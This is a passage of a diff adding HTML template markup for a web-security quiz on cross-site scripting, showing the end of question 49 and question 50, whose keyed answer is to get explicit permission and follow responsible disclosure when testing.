+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q49" id="q49c" value="c">
+                    <label class="form-check-label" for="q49c">Network-based XSS</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q49" id="q49d" value="d">
+                    <label class="form-check-label" for="q49d">External script inclusion from CDN only</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 50 -->
+    <div class="card mcq-card mb-2" data-correct="c">
+        <div class="card-body">
+            <h5 class="card-title mb-2">50. Which statement is true about XSS testing?</h5>
+            <p class="card-text">Choose the true statement.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q50" id="q50a" value="a">
+                    <label class="form-check-label" for="q50a">You can test any live site without permission</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q50" id="q50b" value="b">
+                    <label class="form-check-label" for="q50b">XSS only affects server-side code</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q50" id="q50c" value="c">
+                    <label class="form-check-label" for="q50c">Always obtain explicit permission and follow responsible disclosure when testing</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q50" id="q50d" value="d">
+                    <label class="form-check-label" for="q50d">XSS can't be prevented</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+</div>
+{% endblock mcq %}
+
+
